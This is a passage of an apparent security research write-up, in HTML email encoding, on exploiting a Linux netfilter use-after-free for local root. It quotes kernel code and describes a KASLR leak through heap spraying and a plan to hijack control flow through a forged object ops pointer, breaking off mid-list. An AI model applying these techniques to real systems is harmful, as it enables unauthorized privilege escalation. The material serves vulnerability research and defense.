<p class=3D"MsoNormal">Our exploit has been tested in a Ubuntu 20.04 with k=
ernel 5.12.13.</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">In this post we will analyze the process we adopted =
to exploit this use-after-free to achieve Local Privilege Escalation (LPE),=
 bypassing all the default mitigations (SMEP, SMAP, KASLR, Heap randomizati=
on, ...)</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal"># Vulnerability analysis</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">The vulnerability is located in the netfilter subsys=
tem. A feature in netfilter allows referencing sets from other tables in th=
e same batch, so you are in the context of a specific table A, and are able=
 to operate with a set in table B
 by using its `SET_ID`. This way you can cross-reference objects from the c=
urrent table, and references will be created in the set from the second tab=
le.</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">Once the first table is removed, all the member obje=
cts, as well as the table itself, are kfree()'d, but the references will be=
 kept in the second table, so we can reach a use-after-free condition.</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">When we provide a `SET_ID` to lookup a set, this is =
the general involved function:</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">```c</p>
<p class=3D"MsoNormal">struct nft_set *nft_set_lookup_global(const struct n=
et *net,</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;=
&nbsp;&nbsp; const struct nft_table *table,</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;=
&nbsp;&nbsp; const struct nlattr *nla_set_name,</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;=
&nbsp;&nbsp; const struct nlattr *nla_set_id,</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;=
 &nbsp;&nbsp;u8 genmask)</p>
<p class=3D"MsoNormal">{</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; struct nft_set *set;</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; set =3D nft_set_lookup(table, nla_set_name, genmask);</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; if (IS_ERR(set)) {</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; =
if (!nla_set_id)</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return se=
t;</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; =
set =3D nft_set_lookup_byid(net, nla_set_id, genmask);</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; }</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; return set;</p>
<p class=3D"MsoNormal">}</p>
<p class=3D"MsoNormal">EXPORT_SYMBOL_GPL(nft_set_lookup_global);</p>
<p class=3D"MsoNormal">```</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">Which ends up calling `nft_set_lookup_byid()`:</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">```c</p>
<p class=3D"MsoNormal">static struct nft_set *nft_set_lookup_byid(const str=
uct net *net,</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp; const struct n=
lattr *nla, u8 genmask)</p>
<p class=3D"MsoNormal">{</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; struct nft_trans *trans;</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; u32 id =3D ntohl(nla_get_be32(nla));</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; list_for_each_entry(trans, &amp;net-&gt;nft.commit_list, list) {</=
p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; =
if (trans-&gt;msg_type =3D=3D NFT_MSG_NEWSET) {</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; struct nf=
t_set *set =3D nft_trans_set(trans);</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (id =
=3D=3D nft_trans_set_id(trans) &amp;&amp;</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nb=
sp;&nbsp; nft_active_genmask(set, genmask))</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return set;</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; =
}</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; }</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; return ERR_PTR(-ENOENT);</p>
<p class=3D"MsoNormal">}</p>
<p class=3D"MsoNormal">```</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">We can see below how the reference is made when sett=
ing `NFTA_SET_ELEM_OBJREF` on creating a set element (`nft_add_set_elem()` =
at `nf_tables_api.c`):</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">```c</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">...</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">if (obj) {</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; *nft_set_ext_obj(ext) =3D obj;</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; obj-&gt;use++;</p>
<p class=3D"MsoNormal">}</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">...</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">```</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">## Triggering the Use-After-Free</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">Once we left a reference in a second table after rem=
oving the first, we can operate over the object.</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">An object is defined as the following:</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">```c</p>
<p class=3D"MsoNormal">struct nft_object {</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; struct list_head&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; list;</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; struct rhlist_head&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
&nbsp;&nbsp;&nbsp; rhlhead;</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; struct nft_object_hash_key&nbsp;&nbsp;&nbsp;&nbsp; key;</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; u32&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp; genmask:2,</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; use:30;</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; u64&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp; handle;</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; u16&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp; udlen;</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; u8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp; *udata;</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; /* runtime data below here */</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; const struct nft_object_ops&nbsp;&nbsp;&nbsp;&nbsp; *ops ____cache=
line_aligned;</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; unsigned char&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; data[]</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; =
__attribute__((aligned(__alignof__(u64))));</p>
<p class=3D"MsoNormal">};</p>
<p class=3D"MsoNormal">```</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">To reference an object from a table, we can use `NFT=
_SET_EXT_OBJREF`. This feature is helpful when used in maps, as we can use =
a different object (eg.: counter) when a specific index (like a port) is fo=
und in the set/map. Example:</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">```</p>
<p class=3D"MsoNormal">table ip foo {</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; counter cnt_obj {</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; =
packets 0 bytes 0</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; }</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; map set1 {</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; =
type inet_service : counter</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; =
elements =3D { 1337 : &quot;cnt_obj&quot; }</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; }</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; chain output {</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; =
type filter hook output priority filter; policy accept;</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; =
counter name tcp dport map @set1</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; }</p>
<p class=3D"MsoNormal">}</p>
<p class=3D"MsoNormal">```</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">This reference is not heavily used, in fact, there a=
re just a few operations applied over it. First, every time we request its =
name, the contents of `obj-&gt;key.name` are read. Every time a new referen=
ce is created (e.g: in a map) the `obj-&gt;use`
 will be increased, and will be decreased every time we remove an element w=
ith its reference.</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">Another access we can force is the object functional=
ity itself, for example, in counters there is a percpu pointer that is used=
 to access a structure where the values for the number of packets and data =
are increased or decreased. The interesting
 point is that to reach this through a map, the following code is executed:=
</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">```c</p>
<p class=3D"MsoNormal">static void nft_objref_map_eval(const struct nft_exp=
r *expr,</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; struct nft_regs *r=
egs,</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; const struct nft_p=
ktinfo *pkt)</p>
<p class=3D"MsoNormal">{</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; struct nft_objref_map *priv =3D nft_expr_priv(expr);</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; const struct nft_set *set =3D priv-&gt;set;</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; const struct nft_set_ext *ext;</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; struct nft_object *obj;</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; bool found;</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; found =3D set-&gt;ops-&gt;lookup(nft_net(pkt), set, &amp;regs-&gt;=
data[priv-&gt;sreg],</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &amp;ext);</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; if (!found) {</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; =
regs-&gt;verdict.code =3D NFT_BREAK;</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; =
return;</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; }</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; obj =3D *nft_set_ext_obj(ext);</p>
<p class=3D"MsoNormal">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp; obj-&gt;ops-&gt;eval(obj, regs, pkt);</p>
<p class=3D"MsoNormal">}</p>
<p class=3D"MsoNormal">```</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">There is a dereference of `obj-&gt;ops-&gt;eval`, wh=
ich means that if as part of the use-after-free we can take control of the =
object and modify `obj-&gt;ops`, we have the possibility of hijacking RIP a=
nd the legitimate execution flow to escalate
 our privileges.</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">## Achieving KASLR leak</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">As already mentioned, we can issue reads over `obj-&=
gt;key.name` to retrieve the name of the object. This is an important funct=
ionality in the exploitation as it will give us interesting leaks and primi=
tives.</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">On object creation, we can specify a string for the =
name of the object. This is interesting as we can craft a string of a speci=
fic size to enter the `obj-&gt;key.name` allocation in a specific slab of o=
ur need / interest.</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">The designed KASLR leak primitive is pretty straight=
forward: As `seq_operations` structs are of 0x20 bytes, we can provide a `0=
x1f`-sized string (allocation is made with string size plus one for the nul=
l terminator) so that when `obj-&gt;key.name`
 is freed, spraying with `seq_operations` will make one of them allocated i=
n the space we had our string placed in.</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">We can request the name of the object now and the co=
ntents of `seq_operations` will be returned to us, resulting in a `single_o=
pen` leak, allowing us to calculate the base for KASLR.</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">## Designing the strategy</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">At this point, we realize that if we want to hijack =
the `obj-&gt;ops-&gt;eval` execution, we will need a way to store a fake `n=
ft_object_ops` struct in kernel memory (due to SMAP migitation), and predic=
t its address to place it in `obj-&gt;ops`.</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">We can achieve this condition by applying the follow=
ing process:</p>
<p class=3D"MsoNormal"><o:p>&nbsp;</o:p></p>
<p class=3D"MsoNormal">1) Trigger the use-after-free and provide a 0xc7-siz=
ed string (`nft_object` counter allocation size).</p>
<p class=3D"MsoNormal">2) Create another table.</p>
<p class=3D"MsoNormal">3) Spray with `nft_object` structs by adding multipl=
e objects to the last created table.</p>
<p class=3D"MsoNormal">4) If it succeeds, a `nft_object` struct will occupy=
 the memory space where the string was.</p>
<p class=3D"MsoNormal">5) Request the string name for the UAF'ed object, th=
